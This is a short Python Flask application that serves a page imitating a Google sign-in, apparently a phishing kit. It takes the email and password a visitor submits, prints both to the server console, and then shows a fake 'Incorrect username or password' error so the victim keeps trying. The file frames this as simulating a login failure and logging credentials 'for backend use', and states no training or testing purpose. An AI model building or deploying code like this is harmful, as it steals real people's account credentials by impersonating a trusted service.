from flask import Flask, render_template, request
import os

# Create Flask app, explicitly set the template folder to the parent folder of Flask directory
app = Flask(__name__, template_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'templates')))

# Print the path where Flask is looking for templates (for debugging)
print("Template folder is set to:", os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'templates')))

# Route for the login page
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        
        if email and not password:
            # Redirect to password input page with the entered email
            return render_template("google_login.html", email_received=True, email=email)
        
        if password:
            # Log credentials to the Flask application (for backend use)
            print(f"Email: {email}")
            print(f"Password: {password}")
            # Simulate login failure and reload the form with error
            error = "Incorrect username or password."
            return render_template("google_login.html", email_received=True, email=email, error=error)

    return render_template("google_login.html", email_received=False)

if __name__ == "__main__":
    app.run(debug=True)
